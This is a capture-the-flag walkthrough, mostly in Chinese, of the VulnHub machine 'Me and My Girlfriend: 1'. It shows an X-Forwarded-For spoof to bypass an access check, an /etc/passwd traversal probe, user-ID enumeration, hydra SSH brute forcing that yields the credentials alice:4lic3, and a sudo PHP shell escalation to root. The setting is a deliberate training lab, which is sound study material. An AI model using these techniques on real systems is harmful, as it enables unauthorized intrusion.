# Me and My Girlfriend: 1

2024-6-11 https://www.vulnhub.com/entry/me-and-my-girlfriend-1,409/

difficulty: Beginner

## IP

192.168.5.36

## Scan

Open Port -> 22,80

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 57e15658460433563dc34ba793ee2316 (DSA)
|   2048 3b264de4a03bf875d96e1555828c7197 (RSA)
|   256 8f48979b55115bf16c1db34abc36bdb0 (ECDSA)
|_  256 d0c302a1c4c2a8ac3b84ae8fe5796676 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.7 (Ubuntu)
```

gobuster 先扫描下，

访问 http://192.168.5.36/ 查看源码发现提示 Maybe you can search how to use x-forwarded-for , 使用 chrome plugin header editor 添加 header X-Forwarded-For: 127.0.0.1

再次访问主页跳转到 http://192.168.5.36/?page=index

看菜单中的几个功能，像是有 LFI 文件包含，先看看有没有。

http://192.168.5.36/index.php?page=../../../../../../../etc/passwd 没有反应，暂时没发现 LFI，应该是后台程序在后面加上了.php 后缀。

http://192.168.5.36/index.php?page=register 注册一个账号后，进行登陆，发现 url 显示 http://192.168.5.36/index.php?page=dashboard&user_id=12 这里 user_id 可能存在用户遍历，尝试 0-20,发现了一些其他的用户，分别将用户名和密码保存，然后使用 hydra 进行 ssh 爆破，发现了一个可以登陆的 ssh 用户凭据 alice:4lic3

使用发现的凭据 alice:4lic3 ssh 登陆，进行枚举，发现 sudo 存在利用点：

发现 flag1：

```
alice@gfriEND:~/.my_secret$ cat flag1.txt
Greattttt my brother! You saw the Alice's note! Now you save the record information to give to bob! I know if it's given to him then Bob will be hurt but this is better than Bob cheated!

Now your last job is get access to the root and read the flag ^_^

Flag 1 : gfriEND{2f5f21b2af1b8c3e227bcf35544f8f09}
```

```
(root) NOPASSWD: /usr/bin/php

sudo php -r "system('/bin/bash');"

root@gfriEND:~# id
uid=0(root) gid=0(root) groups=0(root)
root@gfriEND:~# cd /root
root@gfriEND:/root# ls
flag2.txt
root@gfriEND:/root# cat flag2.txt

  ________        __    ___________.__             ___________.__                ._.
 /  _____/  _____/  |_  \__    ___/|  |__   ____   \_   _____/|  | _____     ____| |
/   \  ___ /  _ \   __\   |    |   |  |  \_/ __ \   |    __)  |  | \__  \   / ___\ |
\    \_\  (  <_> )  |     |    |   |   Y  \  ___/   |     \   |  |__/ __ \_/ /_/  >|
 \______  /\____/|__|     |____|   |___|  /\___  >  \___  /   |____(____  /\___  /__
        \/                              \/     \/       \/              \//_____/ \/

Yeaaahhhh!! You have successfully hacked this company server! I hope you who have just learned can get new knowledge from here :) I really hope you guys give me feedback for this challenge whether you like it or not because it can be a reference for me to be even better! I hope this can continue :)

Contact me if you want to contribute / give me feedback / share your writeup!
Twitter: @makegreatagain_
Instagram: @aldodimas73

Thanks! Flag 2: gfriEND{56fbeef560930e77ff984b644fde66e7}
```
